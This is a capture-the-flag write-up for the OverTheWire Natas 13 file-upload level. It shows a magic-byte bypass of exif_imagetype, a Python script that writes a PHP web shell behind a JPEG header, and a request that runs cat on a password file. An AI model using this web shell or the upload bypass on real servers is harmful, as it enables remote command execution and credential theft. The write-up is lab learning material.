By looking at the source code the challenge gave us, there are some interesting points.

```html
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" /> 
```

As we can see, the filename is coded by a php function appended with a jpg extention.

Here is what the php code looks like

```php
<?  

function genRandomString() { 
    $length = 10; 
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
    $string = "";     

    for ($p = 0; $p < $length; $p++) { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 

    return $string; 
} 

function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 

if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 
     
    $err=$_FILES['uploadedfile']['error']; 
    if($err){ 
        if($err === 2){ 
            echo "The uploaded file exceeds MAX_FILE_SIZE"; 
        } else{ 
            echo "Something went wrong :/"; 
        } 
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 
        echo "File is not an image"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
} else { 
?> 
```

Looking into the if statement, the server checks the image type with **exif\_imagetype**, lets take a look at the php manual of it.

```
exif_imagetype() reads the first bytes of an image and checks its signature.
```

Basically, the function checks the **Magic number** of the file.
The Magic number of jpeg files is **FF D8 FF**

Lets create a file named **shell.jpeg**.
I created a liitle python script to write the magic number and the php code.

```python
fd = open('shell.jpeg', 'w')
fd.write('\xFF\xD8\xFF' + '<?php passthru($_GET("cmd")); ?>')
fd.close()
```

I use Burp Suite to intercept the upload request and modify the **RandomString.jpg** to **shell.php**.

We can now make a GET request to shell.php file and use parameters to show the password
```
http://natas13.natas.labs.overthewire.org/upload/jwsa8f7ygt.php?cmd=cat%20/etc/natas_webpass/natas14
```


